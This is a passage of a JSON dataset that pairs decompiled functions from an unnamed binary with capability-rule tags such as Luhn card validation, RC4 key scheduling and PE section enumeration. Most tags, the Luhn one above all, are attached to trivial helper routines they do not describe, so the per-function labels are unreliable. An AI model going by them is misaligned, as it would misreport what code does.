            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0002c1b0(int32_t arg_8h, int32_t arg_ch)\n\n{\n    uint uVar1;\n    \n    uVar1 = fcn.0002bdc0(arg_ch);\n    fcn.00078ac8(arg_8h, uVar1);\n    *(arg_8h + arg_ch + -1) = 0;\n    return;\n}\n",
        "token_count": 89
    },
    "0002c1e0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0002c1e0(int32_t arg_8h, int32_t arg_ch)\n\n{\n    uint uVar1;\n    \n    uVar1 = fcn.0002be20(arg_ch);\n    fcn.00078ac8(arg_8h, uVar1);\n    *(arg_8h + arg_ch + -1) = 0;\n    return;\n}\n",
        "token_count": 88
    },
    "0002c210": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.0002c210(void)\n\n{\n    uint32_t var_4h;\n    \n    if (*0x800cbc17 != '\\0') {\n        for (var_4h = 0; var_4h < 0x40; var_4h = var_4h + 1) {\n            *(var_4h + 0x800cbbd8) = *(var_4h + 0x800cbbd8) ^ *(var_4h + 0x800cbb98);\n        }\n    }\n    return 0x800cbbd8;\n}\n",
        "token_count": 133
    },
    "0002c270": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.0002c270(void)\n\n{\n    uint32_t var_4h;\n    \n    if (*0x800cbc97 != '\\0') {\n        for (var_4h = 0; var_4h < 0x40; var_4h = var_4h + 1) {\n            *(var_4h + 0x800cbc58) = *(var_4h + 0x800cbc58) ^ *(var_4h + 0x800cbc18);\n        }\n    }\n    return 0x800cbc58;\n}\n",
        "token_count": 126
    },
    "0002c2d0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.0002c2d0(void)\n\n{\n    uint32_t var_4h;\n    \n    if (*0x800cbd17 != '\\0') {\n        for (var_4h = 0; var_4h < 0x40; var_4h = var_4h + 1) {\n            *(var_4h + 0x800cbcd8) = *(var_4h + 0x800cbcd8) ^ *(var_4h + 0x800cbc98);\n        }\n    }\n    return 0x800cbcd8;\n}\n",
        "token_count": 131
    },
    "0002c330": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.0002c330(void)\n\n{\n    uint32_t var_4h;\n    \n    if (*0x800cbd97 != '\\0') {\n        for (var_4h = 0; var_4h < 0x40; var_4h = var_4h + 1) {\n            *(var_4h + 0x800cbd58) = *(var_4h + 0x800cbd58) ^ *(var_4h + 0x800cbd18);\n        }\n    }\n    return 0x800cbd58;\n}\n",
        "token_count": 126
    },
    "0002c390": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0002c390(int32_t arg_8h, int32_t arg_ch)\n\n{\n    uint uVar1;\n    \n    uVar1 = fcn.0002c210(arg_ch);\n    fcn.00078ac8(arg_8h, uVar1);\n    *(arg_8h + arg_ch + -1) = 0;\n    return;\n}\n",
        "token_count": 86
    },
    "0002c3c0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0002c3c0(int32_t arg_8h, int32_t arg_ch)\n\n{\n    uint uVar1;\n    \n    uVar1 = fcn.0002c210();\n    fcn.00078ae6(arg_8h, arg_ch, 0x800546ac, uVar1);\n    *(arg_8h + arg_ch + -1) = 0;\n    return;\n}\n",
        "token_count": 96
    },
    "0002c3f0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0002c3f0(int32_t arg_8h, int32_t arg_ch)\n\n{\n    uint uVar1;\n    \n    uVar1 = fcn.0002c270();\n    fcn.00078ae6(arg_8h, arg_ch, 0x80054694, uVar1);\n    *(arg_8h + arg_ch + -1) = 0;\n    return;\n}\n",
        "token_count": 96
    },
    "0002c420": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0002c420(int32_t arg_8h, int32_t arg_ch)\n\n{\n    uint uVar1;\n    \n    uVar1 = fcn.0002c2d0();\n    fcn.00078ae6(arg_8h, arg_ch, 0x80054694, uVar1);\n    *(arg_8h + arg_ch + -1) = 0;\n    return;\n}\n",
        "token_count": 96
    },
    "0002c450": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0002c450(int32_t arg_8h, int32_t arg_ch)\n\n{\n    uint uVar1;\n    \n    uVar1 = fcn.0002c330();\n    fcn.00078ae6(arg_8h, arg_ch, 0x80054694, uVar1);\n    *(arg_8h + arg_ch + -1) = 0;\n    return;\n}\n",
        "token_count": 94
    },
    "0002c4c0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0002c4c0(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    uint uVar1;\n    uint var_8h;\n    uint var_4h;\n    \n    uVar1 = fcn.0002c480(arg_8h, arg_ch, arg_10h, &arg_14h);\n    return uVar1;\n}\n",
        "token_count": 95
    },
    "0002c910": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0002c910(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t var_ch;\n    uint32_t var_8h;\n    uint32_t var_4h;\n    \n    var_ch = 0;\n    fcn.00034a10(0x800cd258);\n    iVar1 = fcn.000238f0(0xfffffffe, 8, &var_4h, &var_ch);\n    if (iVar1 == 0) {\n        for (var_8h = 0; var_8h < var_4h; var_8h = var_8h + 1) {\n            if ((*(var_ch + 0x10 + var_8h * 0x40) == arg_8h) || (*(var_ch + 0x1c + var_8h * 0x40) == arg_8h)) {\n                if (*(var_ch + 0x10 + var_8h * 0x40) == arg_8h) {\n                    fcn.00023b50(*(var_ch + var_8h * 0x40), *(var_ch + 8 + var_8h * 0x40), *(var_ch + 4 + var_8h * 0x40)\n                                 , 0, 0);\n                }\n                else {\n                    fcn.00023b50(*(var_ch + var_8h * 0x40), *(var_ch + 8 + var_8h * 0x40), *(var_ch + 4 + var_8h * 0x40)\n                                 , 3, 0);\n                }\n                fcn.0002c840(*(var_ch + 0xc + var_8h * 0x40));\n            }\n        }\n    }\n    fcn.00034a80(0x800cd258);\n    fcn.00023b90(var_ch);\n    return;\n}\n",
        "token_count": 430
    },
    "000339a0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.000339a0(int32_t arg_8h)\n\n{\n    fcn.000357f0(*(arg_8h + 4));\n    return;\n}\n",
        "token_count": 41
    },
    "00035380": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nchar * __cdecl fcn.00035380(char *arg_8h, int32_t arg_ch)\n\n{\n    char *var_4h;\n    \n    var_4h = NULL;\n    for (; *arg_8h != '\\0'; arg_8h = arg_8h + 1) {\n        if (*arg_8h == arg_ch) {\n            var_4h = arg_8h;\n        }\n    }\n    return var_4h;\n}\n",
        "token_count": 103
    },
    "000353c0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.000353c0(char *arg_8h)\n\n{\n    int32_t var_4h;\n    \n    var_4h = 0;\n    for (; *arg_8h != '\\0'; arg_8h = arg_8h + 1) {\n        var_4h = var_4h + 1;\n    }\n    return var_4h;\n}\n",
        "token_count": 90
    },
    "000359a0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nvoid __cdecl fcn.000359a0(uint arg_8h)\n\n{\n    uint32_t uVar1;\n    uint uVar2;\n    bool bVar3;\n    uint var_1ch;\n    int32_t var_18h;\n    int32_t var_14h;\n    uint32_t var_10h;\n    uint32_t var_ch;\n    uint var_1h;\n    \n    (**0x8005100c)();\n    var_10h = 0xffffffff;\n    var_ch = 0;\n    var_18h = 0;\n    for (var_14h = 0; var_14h < 100; var_14h = var_14h + 1) {\n        uVar1 = *(var_14h * 0x10 + -0x7ff32d64);\n        if ((uVar1 <= var_ch) && ((uVar1 < var_ch || (*(var_14h * 0x10 + -0x7ff32d68) < var_10h)))) {\n            var_10h = *(var_14h * 0x10 + -0x7ff32d68);\n            var_ch = *(var_14h * 0x10 + -0x7ff32d64);\n            var_18h = var_14h;\n        }\n    }\n    uVar2 = fcn.00078b34();\n    *(var_18h * 0x10 + -0x7ff32d70) = uVar2;\n    *(var_18h * 0x10 + -0x7ff32d6c) = arg_8h;\n    *(var_18h * 0x10 + -0x7ff32d68) = *0x800ce6f8;\n    *(var_18h * 0x10 + -0x7ff32d64) = *0x800ce6fc;\n    bVar3 = 0xfffffffe < *0x800ce6f8;\n    *0x800ce6f8 = *0x800ce6f8 + 1;\n    *0x800ce6fc = *0x800ce6fc + bVar3;\n    if ((*0x800ce6f8 | *0x800ce6fc) == 0) {\n        for (var_14h = 0; var_14h < 100; var_14h = var_14h + 1) {\n            *(var_14h * 0x10 + -0x7ff32d68) = 0;\n            *(var_14h * 0x10 + -0x7ff32d64) = 0;\n        }\n    }\n    (**0x80051010)();\n    return;\n}\n",
        "token_count": 620
    },
    "00035ae0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nuint fcn.00035ae0(void)\n\n{\n    int32_t iVar1;\n    uint var_ch;\n    int32_t var_8h;\n    uint var_1h;\n    \n    var_ch = 0xffffffff;\n    (**0x8005100c)();\n    var_8h = 0;\n    do {\n        if (99 < var_8h) {\ncode_r0x00035b3a:\n            (**0x80051010)();\n            return var_ch;\n        }\n        iVar1 = fcn.00078b34();\n        if (*(var_8h * 0x10 + -0x7ff32d70) == iVar1) {\n            var_ch = *(var_8h * 0x10 + -0x7ff32d6c);\n            goto code_r0x00035b3a;\n        }\n        var_8h = var_8h + 1;\n    } while( true );\n}\n",
        "token_count": 221
    },
    "00036ce0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00036ce0(uint32_t *arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    iVar1 = (**0x800511c0)();\n    var_4h = 0;\n    do {\n        if (0x2fff < var_4h) {\ncode_r0x00036d30:\n            (**0x800510ec)(0);\n            return;\n        }\n        iVar2 = fcn.00078a3e(0x80054800, iVar1 + var_4h, 6);\n        if (iVar2 == 0) {\n            *arg_8h = var_4h;\n            goto code_r0x00036d30;\n        }\n        var_4h = var_4h + 1;\n    } while( true );\n}\n",
        "token_count": 200
    },
    "00036ed0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00036ed0(uint *arg_8h)\n\n{\n    uint uVar1;\n    \n    *arg_8h = 0;\n    arg_8h[1] = 0;\n    arg_8h[2] = 0;\n    arg_8h[3] = 0;\n    uVar1 = fcn.000356f0(0x48);\n    arg_8h[3] = uVar1;\n    (**0x800511a8)(arg_8h[3] + 0x28, 0);\n    (**0x800511dc)(arg_8h[3], 0, 0x7fffffff);\n    (**0x800511dc)(arg_8h[3] + 0x14, 0, 0x7fffffff);\n    return;\n}\n",
        "token_count": 185
    },
    "00037a10": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00037a10(uint arg_8h, uint *arg_ch)\n\n{\n    uint uVar1;\n    char *var_4h;\n    \n    uVar1 = fcn.00036370(arg_8h, &var_4h, 0x10);\n    *arg_ch = uVar1;\n    if (*var_4h == '.') {\n        uVar1 = fcn.00036370(var_4h + 1, &var_4h, 0x10);\n        arg_ch[1] = uVar1;\n    }\n    else {\n        arg_ch[1] = 0;\n    }\n    return 1;\n}\n",
        "token_count": 148
    },
    "00038030": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00038030(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint var_4h;\n    \n    iVar1 = fcn.00078a92(arg_8h, 0x80054808);\n    if ((((iVar1 != 0) && (iVar1 = fcn.00078a92(arg_8h, 0x80054818),  iVar1 != 0)) &&\n        (iVar1 = fcn.00078a92(arg_8h, 0x80054824),  iVar1 != 0)) &&\n       (((iVar1 = fcn.00078a92(arg_8h, 0x80054830),  iVar1 != 0 &&\n         (iVar1 = fcn.00078a92(arg_8h, 0x80054840),  iVar1 != 0)) &&\n        (iVar1 = fcn.00078a92(arg_8h, 0x8005484c),  iVar1 != 0)))) {\n        return 0;\n    }\n    return 1;\n}\n",
        "token_count": 237
    },
    "000380d0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.000380d0(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint var_4h;\n    \n    iVar1 = fcn.000789f6(arg_8h, 0x80054858);\n    if ((((iVar1 != 0) && (iVar1 = fcn.000789f6(arg_8h, 0x80054874),  iVar1 != 0)) &&\n        (iVar1 = fcn.000789f6(arg_8h, 0x8005488c),  iVar1 != 0)) &&\n       (((iVar1 = fcn.000789f6(arg_8h, 0x800548a0),  iVar1 != 0 &&\n         (iVar1 = fcn.000789f6(arg_8h, 0x800548bc),  iVar1 != 0)) &&\n        (iVar1 = fcn.000789f6(arg_8h, 0x800548d4),  iVar1 != 0)))) {\n        return 0;\n    }\n    return 1;\n}\n",
        "token_count": 240
    },
    "0003cfe0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0003cfe0(uint noname_0, int32_t arg_ch, uint arg_10h)\n\n{\n    uint var_4h;\n    \n    *(arg_ch + 0x8c) = arg_10h;\n    fcn.00034570(arg_ch + 0x90);\n    return;\n}\n",
        "token_count": 75
    },
    "0003d010": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.0003d010(void)\n\n{\n    int32_t iVar1;\n    uint var_8h;\n    int32_t var_4h;\n    \n    var_8h = 0;\n    for (var_4h = 0; var_4h < 100; var_4h = var_4h + 1) {\n        iVar1 = fcn.0003f990(var_4h, 0);\n        if (iVar1 != 0) {\n            var_8h = fcn.0003d060(var_4h);\n        }\n    }\n    return var_8h;\n}\n",
        "token_count": 137
    },
    "0003d900": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0003d900(int32_t arg_8h)\n\n{\n    uint var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    var_ch = 0;\n    fcn.00037640(0x800db788, &var_4h, 1);\n    var_8h = 0;\n    do {\n        if (*0x800db780 <= var_8h) {\ncode_r0x0003d966:\n            fcn.00037670(0x800db788, &var_4h, 1);\n            return var_ch;\n        }\n        if (*(*0x800db784 + 0xc + var_8h * 0x10) == arg_8h) {\n            var_ch = *(*0x800db784 + 4 + var_8h * 0x10);\n            goto code_r0x0003d966;\n        }\n        var_8h = var_8h + 1;\n    } while( true );\n}\n",
        "token_count": 227
    },
    "0003e360": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.0003e360(int32_t arg_8h, uint32_t arg_ch, int32_t arg_10h)\n\n{\n    char cVar1;\n    uint var_ch;\n    uint32_t var_8h;\n    uint var_4h;\n    \n    var_8h = 0;\n    while( true ) {\n        if (arg_ch <= var_8h) {\n            return 0xffffffff;\n        }\n        cVar1 = (**0x80051214)(arg_8h + var_8h);\n        if (cVar1 == '\\0') break;\n        if (*(arg_8h + var_8h) == arg_10h) {\n            return var_8h;\n        }\n        var_8h = var_8h + 4;\n    }\n    return 0xffffffff;\n}\n",
        "token_count": 185
    },
    "0003f660": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0003f660(uchar *arg_8h, uint *arg_ch)\n\n{\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_8h = 0x240022;\n    var_4h = 0x80054ffc;\n    *arg_ch = 0;\n    fcn.00078bfa(arg_8h, 0, 0x6c);\n    *arg_8h = 5;\n    arg_8h[1] = 1;\n    *(arg_8h + 0x30) = var_8h;\n    *(arg_8h + 0x34) = var_4h;\n    *(arg_8h + 8) = 0x8007f770;\n    *(arg_8h + 0xc) = 0x8007f790;\n    *(arg_8h + 0x10) = 0x8007f7b0;\n    *(arg_8h + 0x14) = 0x8007f7d0;\n    *(arg_8h + 0x18) = 0x8007f7f0;\n    *(arg_8h + 0x1c) = 0x8007f810;\n    *(arg_8h + 0x20) = 0x8007f830;\n    *(arg_8h + 0x24) = 0x8007f850;\n    *(arg_8h + 0x28) = 0x8007f870;\n    *(arg_8h + 0x2c) = 0x8007f890;\n    *(arg_8h + 0x38) = 0x8007f8f0;\n    *(arg_8h + 0x3c) = 0x8007f8b0;\n    *(arg_8h + 0x40) = 0x8007f8d0;\n    *(arg_8h + 0x48) = 0;\n    *(arg_8h + 0x44) = 0x8007f910;\n    (**0x80051030)(&var_ch, arg_ch, arg_8h, 0x6c);\n    return var_ch;\n}\n",
        "token_count": 512
    },
    "0003f930": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0003f930(void)\n\n{\n    fcn.00078bfa(0x800ce840, 0, 0x34);\n    fcn.00037440(0x800ce848);\n    fcn.00040eb0();\n    return;\n}\n",
        "token_count": 62
    },
    "00041760": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00041760(int32_t arg_8h, uint arg_ch)\n\n{\n    *(arg_8h + 0x18) = arg_ch;\n    fcn.00034570(arg_8h + 0x14);\n    return;\n}\n",
        "token_count": 60
    },
    "00041780": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00041780(int32_t arg_8h)\n\n{\n    fcn.000345a0(arg_8h + 0x14, 0xffffffff);\n    return *(arg_8h + 0x18);\n}\n",
        "token_count": 55
    },
    "00042f30": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "parse PE header/27dc37a2d08e4034aa7bcaa8b888b251",
            "enumerate PE sections"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00042f30(uint arg_8h, uint noname_1, uchar *arg_10h, uint arg_14h)\n\n{\n    uint uVar1;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    fcn.00078bfa(arg_10h, 0, 0x68);\n    *arg_10h = 0x8b;\n    *(arg_10h + 2) = 0x68;\n    arg_10h[1] = 1;\n    arg_10h[4] = 6;\n    arg_10h[5] = 0;\n    arg_10h[6] = 1;\n    arg_10h[7] = 0;\n    *(arg_10h + 8) = 0;\n    fcn.000789c0(&var_8h, 0x800cb728);\n    *(arg_10h + 0xc) = var_8h;\n    *(arg_10h + 0x10) = var_4h;\n    fcn.000789c0(&var_10h, 0x800cb728);\n    *(arg_10h + 0x14) = var_10h;\n    *(arg_10h + 0x18) = var_ch;\n    fcn.000789c0(&var_18h, 0x800cb778);\n    *(arg_10h + 0x1c) = var_18h;\n    *(arg_10h + 0x20) = var_14h;\n    *(arg_10h + 0x24) = 0x800830b0;\n    *(arg_10h + 0x2c) = 0x800830d0;\n    *(arg_10h + 0x30) = 0x80083130;\n    *(arg_10h + 0x34) = 0x80083110;\n    *(arg_10h + 0x38) = 0x800830f0;\n    *(arg_10h + 0x28) = 0x800832b0;\n    *(arg_10h + 0x50) = 0x80083150;\n    *(arg_10h + 0x54) = 0x80083190;\n    *(arg_10h + 0x58) = 0x80083170;\n    *(arg_10h + 0x3c) = 0x80083230;\n    *(arg_10h + 0x4c) = 0x80083250;\n    *(arg_10h + 0x40) = 0x80083210;\n    *(arg_10h + 0x48) = 0x80083270;\n    *(arg_10h + 0x5c) = 0x800831d0;\n    *(arg_10h + 0x60) = 0x800831f0;\n    *(arg_10h + 100) = 0x800831b0;\n    *(arg_10h + 0x44) = 0x80083290;\n    uVar1 = (**0x800db87c)(arg_8h, arg_10h, arg_10h, arg_14h);\n    return uVar1;\n}\n",
        "token_count": 773
    },
    "00044ff0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00044ff0(uint arg_8h, uint *arg_ch, uint *arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_8h;\n    uint var_4h;\n    \n    var_8h = 0;\n    var_4h = 0;\n    var_44h = 0;\n    fcn.00078bfa(&var_40h, 0, 0x38);\n    var_8h = arg_14h;\n    var_4h = arg_18h;\n    var_44h = *arg_ch;\n    var_40h = arg_ch[1];\n    var_3ch = arg_ch[2];\n    var_38h = arg_ch[3];\n    var_34h = arg_14h;\n    var_30h = arg_18h;\n    var_1ch = *arg_10h;\n    var_18h = arg_10h[1];\n    var_14h = arg_10h[2];\n    var_10h = arg_10h[3];\n    (**0x800ce780)(arg_8h, &var_44h, 0, 0);\n    return;\n}\n",
        "token_count": 343
    },
    "000460d0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.000460d0(uint arg_8h)\n\n{\n    fcn.00037f70();\n    fcn.000357f0(arg_8h);\n    return 0;\n}\n",
        "token_count": 46
    },
    "00046490": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00046490(int32_t arg_8h)\n\n{\n    uint uVar1;\n    uint var_4h;\n    \n    uVar1 = fcn.00046840(*(arg_8h + 0x640), *(arg_8h + 0x644), *(arg_8h + 0x638));\n    (**0x800510c4)(arg_8h + 0x688, 0, 0);\n    return uVar1;\n}\n",
        "token_count": 109
    },
    "00049650": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00049650(int32_t arg_8h, int32_t arg_ch, uint32_t arg_10h)\n\n{\n    uchar uVar1;\n    uint var_10h;\n    uint32_t var_8h;\n    uint var_4h;\n    \n    for (var_8h = 0; var_8h < arg_10h; var_8h = var_8h + 1) {\n        uVar1 = *(arg_8h + var_8h);\n        *(arg_8h + var_8h) = *(arg_ch + var_8h);\n        *(arg_ch + var_8h) = uVar1;\n    }\n    return;\n}\n",
        "token_count": 157
    },
    "00049b40": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00049b40(int32_t arg_8h)\n\n{\n    uint var_18h;\n    uint32_t var_8h;\n    int32_t var_4h;\n    \n    var_4h = *(arg_8h + 0xc) + 0xe;\n    var_8h = *(*(arg_8h + 0xc) + 0x1a);\n    fcn.00078ad4(&var_18h, 0x80055238, var_8h & 0xff, var_8h >> 8 & 0xff, var_8h >> 0x10 & 0xff, var_8h >> 0x18);\n    fcn.0004b790(*(arg_8h + 0x14), *(arg_8h + 0x18), &var_18h, 0, 0);\n    return;\n}\n",
        "token_count": 203
    },
    "00049bb0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00049bb0(uint arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint32_t var_ch;\n    uint var_8h;\n    \n    var_10h = 0;\n    iVar1 = fcn.00049c10(arg_8h, arg_ch, &var_10h, &var_ch, &var_8h, 0, 0);\n    if ((iVar1 == 0) || (var_ch < 8)) {\n        var_18h = 0;\n    }\n    else {\n        var_18h = 1;\n    }\n    fcn.000357f0(var_10h);\n    return var_18h;\n}\n",
        "token_count": 179
    },
    "0004f780": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0004f780(uint noname_0, uint noname_1, uint arg_10h, uint *arg_14h)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint var_20h;\n    uint var_1ch;\n    int32_t var_18h;\n    uint var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    uchar var_5h;\n    uint var_4h;\n    \n    *arg_14h = 0;\n    iVar2 = fcn.00020a80(arg_10h, 0x1a, 2, &var_18h, 4);\n    if (iVar2 == 0) {\n        uVar3 = 0x21590065;\n    }\n    else {\n        iVar2 = fcn.0003f990(var_18h, 0);\n        if (iVar2 == 0) {\n            uVar3 = 0x21590065;\n        }\n        else {\n            iVar2 = fcn.00020a10(arg_10h, 0x2c, 4, &var_10h, 0);\n            if ((iVar2 != 0) && (cVar1 = fcn.00050780(var_10h, &var_20h),  cVar1 != '\\0')) {\n                iVar2 = fcn.00020a10(arg_10h, 0x2d, 4, &var_14h, 0);\n                if ((iVar2 == 0) || (cVar1 = fcn.00050780(var_14h, &var_4h),  cVar1 == '\\0')) {\n                    return 0x21590067;\n                }\n                var_5h = (**0x8005100c)();\n                var_1ch = 0x21590005;\n                var_ch = 0;\n                do {\n                    if (0x3f < var_ch) {\ncode_r0x0004f8b7:\n                        (**0x80051010)();\n                        return var_1ch;\n                    }\n                    if (*(var_ch * 0x30 + -0x7ff255e8) == var_18h) {\n                        *(var_ch * 0x30 + -0x7ff255e8) = 0;\n                        iVar2 = fcn.00037730(0x800ce954);\n                        if (iVar2 == 0) {\n                            fcn.0001ace0(0x800ce954, 0x8008f8d0, 0);\n                        }\n                        fcn.00034570(0x800da9f4);\n                        var_1ch = 0;\n                        goto code_r0x0004f8b7;\n                    }\n                    var_ch = var_ch + 1;\n                } while( true );\n            }\n            uVar3 = 0x21590066;\n        }\n    }\n    return uVar3;\n}\n",
        "token_count": 658
    },
    "0004ff00": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0004ff00(uint noname_0, int32_t *arg_ch)\n\n{\n    uint var_4h;\n    \n    fcn.00034540(*arg_ch + 0x3c);\n    (**0x800512a4)(arg_ch[1]);\n    (**0x80051060)(*arg_ch);\n    return;\n}\n",
        "token_count": 79
    },
    "000519b0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
